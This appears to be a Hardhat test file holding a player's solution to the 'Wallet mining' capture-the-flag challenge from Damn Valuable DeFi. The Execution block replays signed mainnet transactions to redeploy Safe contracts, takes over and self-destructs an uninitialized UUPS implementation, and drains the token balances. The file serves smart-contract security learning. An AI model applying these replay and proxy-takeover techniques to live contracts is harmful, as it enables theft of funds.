const { ethers, upgrades} = require('hardhat'); 
const { expect } = require('chai');


describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;
    let attack;
    
    //const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
    // correct checksummed address:
    const DEPOSIT_ADDRESS = '0x9B6fb606A9f5789444c17768c6dFCF2f83563801';
    
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, ward, player ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [ [ ward.address ], [ DEPOSIT_ADDRESS ] ], // initialization data
            { kind: 'uups', initializer: 'init' }
        );
        
        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);
        
        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {
        require('dotenv').config();// to get INFURA_API_KEY from .env file
        const AttackFactory = await ethers.getContractFactory('AttackWM', player);
        attack = await AttackFactory.connect(player).deploy(player.address,token.address);
        
        const network = "mainnet";
        const APIKEY = process.env.INFURA_API_KEY; 
        const mainnetProvider = new ethers.providers.InfuraProvider(network, APIKEY);
        
        // the hash of creating 'Master Copy' by 0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A
        let txHash = "0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3";
        let tx = await mainnetProvider.getTransaction(txHash);
        let signature = {
            r: tx.r,
            s: tx.s,
            v: tx.v,
        }        
        let txRaw = ethers.utils.serializeTransaction({
            value: tx.value,
            gasPrice: tx.gasPrice,
            gasLimit: tx.gasLimit,
            data: tx.data,
            nonce: tx.nonce,
        }, signature);
        // sending 0.1 eth to 0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A
        await player.sendTransaction({to: tx.from, value: 1n * 10n ** 17n});
        // the replay attack
        await ethers.provider.sendTransaction(txRaw);
        console.log("The first tx is sent");

        // the tx before creating GnosisSafeProxyFactory
        txHash = "0x31ae8a26075d0f18b81d3abe2ad8aeca8816c97aff87728f2b10af0241e9b3d4";
        tx = await mainnetProvider.getTransaction(txHash);
        signature = {
            r: tx.r,
            s: tx.s,
            v: tx.v,
        }
        txRaw = ethers.utils.serializeTransaction({
            value: tx.value,
            gasPrice: tx.gasPrice,
            gasLimit: tx.gasLimit,
            data: tx.data,
            nonce: tx.nonce,
            to: tx.to,
        }, signature);
        await ethers.provider.sendTransaction(txRaw);
        console.log("The second tx is sent");

        // the hash of creating 'GnosisSafeProxyFactory' by 0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A
        txHash = "0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261";
        tx = await mainnetProvider.getTransaction(txHash);
        signature = {
            r: tx.r,
            s: tx.s,
            v: tx.v,
        }
        txRaw = ethers.utils.serializeTransaction({
            value: tx.value,
            gasPrice: tx.gasPrice,
            gasLimit: tx.gasLimit,
            data: tx.data,
            nonce: tx.nonce,
        }, signature);
        await ethers.provider.sendTransaction(txRaw);
        console.log("The third tx is sent");

        // creating proxies and sending tokens
        for (let nonce = 0; nonce < 1000; ++nonce) {
            let addr = await attack.connect(player).callStatic.kek();
            await attack.connect(player).kek();
            if (addr === DEPOSIT_ADDRESS) {
                console.log("DEPOSIT_ADDRESS is created at nonce = ", nonce);
                break;
            }
        }

        // the Implementaion address from _IMPLEMENTATION_SLOT in ERC1967UpgradeUpgradeable.sol
        let addrImp = await ethers.provider.getStorageAt(authorizer.address,'0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc');        
        addrImp = ethers.utils.getAddress(ethers.utils.hexDataSlice(addrImp, 12));

        const fakeAuth = await (await ethers.getContractFactory('AuthorizerUpgradeable',player)).attach(addrImp);
        // authorizer is initialized, but not fakeAuth
        await fakeAuth.connect(player).init([], []);
        // selfdestruct fakeAuth
        await fakeAuth.connect(player).upgradeToAndCall(attack.address, await attack.getKeccak());

        // walletDeployer.can(address,address) in walletDeployer.drop(bytes) should not return '0'
        // 1. iszero(extcodesize(m)) == 0, because m is the address of authorizer
        // 2. iszero(staticcall(gas(),m,p,0x44,p,0x20)) == 0, because 
        // staticcall/delegatecall to a selfdestructed address (fakeAuth) with no code is always successful
        // 3. and(not(iszero(returndatasize())), iszero(mload(p))) == 0, because
        // p is not rewritten in staticcall and has input data
        while ((await token.balanceOf(walletDeployer.address)) > 0) {
            await walletDeployer.connect(player).drop('0x');
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x');

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x');
        
        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(
            await token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq(0);
        expect(
            await token.balanceOf(walletDeployer.address)
        ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)); 
    });
});
